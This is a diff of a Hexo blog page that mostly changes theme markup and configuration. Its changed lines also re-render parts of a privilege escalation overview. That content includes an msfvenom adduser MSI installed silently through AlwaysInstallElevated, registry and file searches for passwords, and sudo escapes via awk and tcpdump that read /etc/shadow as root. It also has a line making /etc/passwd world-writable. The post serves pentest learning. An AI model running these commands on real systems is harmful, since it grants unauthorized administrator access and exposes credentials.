@@ -34,8 +34,8 @@
     
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -65,7 +65,7 @@
 <header class="header-wrapper">
 
     <div class="border-box header-content">
-        <div class="left border-box">
+        <div class="left flex-start border-box">
             
                 <a class="logo-image border-box" href="/">
                     <img src="/images/logo.svg">
@@ -77,67 +77,67 @@
         </div>
 
         <div class="right border-box">
-            <div class="pc">
-                <ul class="menu-list">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
                                 
                                 HOME
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
                                 
                                 ARCHIVES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
                                 
                                 TAGS
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
                                 
                                 CATEGORIES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
                                 
                                 ABOUT
+                                
                             </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas search fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -149,41 +149,66 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/"
-                    >HOME</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives"
-                    >ARCHIVES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags"
-                    >TAGS</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories"
-                    >CATEGORIES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about"
-                    >ABOUT</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            ABOUT
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -241,10 +266,12 @@
                 <span class="datetime">2021-02-19 10:01:30</span>
             </span>
 
-            <span class="meta-info-item post-update-date">
-                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Jun 07 2023 08:46:21 GMT+0800">2023-06-07 08:46:21</span>
-            </span>
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Jun 07 2023 08:46:21 GMT+0800">2023-06-07 08:46:21</span>
+                </span>
+            
         
 
         
@@ -297,10 +324,11 @@
                     </div>
                 
 
-                <div class="post-content keep-markdown-body">
+                <div class="post-content keep-markdown-body ">
                     
 
-                    <p>Recently I get some time to collect materials about privilege escalation, provide you with useful tools and some basic knowledge (overview, not details).</p>
+                    
+                         <p>Recently I get some time to collect materials about privilege escalation, provide you with useful tools and some basic knowledge (overview, not details).</p>
 <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>You can refer to <a class="link"   target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/16.html" >Windows Privilege Escalation Fundamentals<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" >Windows Privilege Escalation Guide<i class="fas fa-external-link-alt"></i></a>.</p>
 <p>We skip <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Information-Gathering">Information Gathering</a> part and continue learning other things.</p>
 <h3 id="Kernel-Exploit"><a href="#Kernel-Exploit" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Tools to search patch vulnerability </p>
@@ -377,16 +405,21 @@
 </li>
 </ol>
 <ul>
-<li><p><code>sc</code> to control service</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">sc</span> Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">&gt; <span class="built_in">sc</span> <span class="built_in">start</span> systcmd</span><br></pre></td></tr></table></figure></li>
-<li><p>AlwaysInstallElevated: allow non-admin users run <code>*.msi</code> to install with <code>SYSTEM</code> privs</p>
+<li><code>sc</code> to control service</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">sc</span> Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">&gt; <span class="built_in">sc</span> <span class="built_in">start</span> systcmd</span><br></pre></td></tr></table></figure>
+<ul>
+<li>AlwaysInstallElevated: allow non-admin users run <code>*.msi</code> to install with <code>SYSTEM</code> privs</li>
+</ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disabled by default</span></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line">[<span class="type">HKEY_LOCAL_MACHINE</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line"><span class="comment"># check using</span></span><br><span class="line">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># if not vulnerable</span></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"><span class="comment"># else it prints key values</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack</span></span><br><span class="line">&gt; msfvenom <span class="literal">-p</span> windows/adduser USER=rottenadmin PASS=P@ssword123! <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-o</span> rotten.msi</span><br><span class="line">&gt; msiexec /quiet /qn /i C:\programdata\rotten.msi</span><br><span class="line"><span class="comment"># /quiet    forbid sending messages to user when installing</span></span><br><span class="line"><span class="comment"># /qn       no GUI</span></span><br><span class="line"><span class="comment"># /i        specify the program</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Unattended Installs: a XML file named Unattended, contains all configs about program installation, like account config<br>They are under dirs:</p>
+
+<ul>
+<li>Unattended Installs: a XML file named Unattended, contains all configs about program installation, like account config<br>They are under dirs:</li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
 <p>Except <code>Unattend.xml</code>, the <code>sysprep.xml</code> and <code>sysprep.inf</code> are also contains something</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> C:*vnc.ini /s /b /c</span><br><span class="line">&gt; <span class="built_in">dir</span> C:\ /s /b /c | findstr /sr *password*</span><br><span class="line">&gt; findstr /<span class="built_in">si</span> password *.txt | *.xml | *.ini</span><br><span class="line">&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">&gt; reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure></li>
-</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> C:*vnc.ini /s /b /c</span><br><span class="line">&gt; <span class="built_in">dir</span> C:\ /s /b /c | findstr /sr *password*</span><br><span class="line">&gt; findstr /<span class="built_in">si</span> password *.txt | *.xml | *.ini</span><br><span class="line">&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">&gt; reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure>
+
 <ol start="3">
 <li>CVE</li>
 </ol>
@@ -421,7 +454,7 @@
 <ul>
 <li>Use <code>cp</code> to overwrite <code>/etc/shadow</code></li>
 <li>Use <code>mv</code> to overwrite <code>/etc/shadow</code>, <code>/etc/sudoers</code></li>
-<li><code>awk</code>: <code>awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></li>
+<li><code>awk</code>: <code>awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</code></li>
 <li><code>man</code>: <ul>
 <li><code>man passwd</code></li>
 <li><code>!/bin/bash</code></li>
@@ -431,8 +464,10 @@
 <li>refer to <a href="/2020/03/31/2020-03-31-About-Reverse-Shell/">About Reverse Shell</a></li>
 </ul>
 </li>
-<li><code>tcpdump</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">$ chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure></li>
+<li><code>tcpdump</code></li>
 </ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.test</span><br><span class="line">$ <span class="built_in">chmod</span> +x /tmp/.test</span><br><span class="line">$ <span class="built_in">sudo</span> tcpdump -<span class="built_in">ln</span> -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</span><br></pre></td></tr></table></figure>
+
 <p>A cheat sheet for <code>Linux</code> privilege escalation is <a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >GTFOBins<i class="fas fa-external-link-alt"></i></a>.</p>
 <p>echo ‘import os,stat ;os.chmod(“&#x2F;etc&#x2F;passwd”, stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)’ &gt;&gt; test.py</p>
 <h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><p>The <code>sudo</code> command is to let normal user execute one command as <code>root</code> user, and the configurations are stored in <code>/etc/sudoers</code>.</p>
@@ -457,7 +492,9 @@
 <li><a class="link"   target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/" >https://i.hacking8.com/tiquan/<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 
+                    
                 </div>
+
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -559,29 +596,25 @@
         <div class="page-main-content-bottom border-box">
             
 <footer class="footer border-box">
-    <div class="border-box website-info-box default">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
         
-            <div class="copyright-info info-item default">
-                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
-                
-                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
-                
-            </div>
+    </div>
 
-            <div class="theme-info info-item default">
-                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
-            </div>
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
 
+    
+
+    
+        <div class="count-info info-item">
             
-
-            
-        
-
-        <div class="count-item info-item default">
-            
-                <span class="count-box border-box word">
+                <span class="count-item border-box word">
                     <span class="item-type border-box">Total words</span>
-                    <span class="item-value border-box word">137k</span>
+                    <span class="item-value border-box word">137.1k</span>
                 </span>
             
 
@@ -589,7 +622,9 @@
 
             
         </div>
-    </div>
+    
+
+    
 </footer>
 
         </div>
@@ -599,7 +634,10 @@
     
         <div class="post-tools right-toc">
             <div class="post-tools-container border-box">
-    <ul class="tools-list border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
         <!-- PC TOC show toggle -->
         
             <li class="tools-item flex-center toggle-show-toc">
@@ -632,13 +670,17 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-toggle-theme-mode flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
 
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
@@ -721,7 +763,9 @@
 
 
 
-<!-- common -->
+
+
+<!-- common js -->
 
 <script src="/js/utils.js"></script>
 
@@ -738,7 +782,7 @@
 <script src="/js/libs/anime.min.js"></script>
 
 
-<!-- local-search -->
+<!-- local search -->
 
     
 <script src="/js/local-search.js"></script>
@@ -749,6 +793,10 @@
 
 
 <div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
     
         <!-- post-helper -->
         
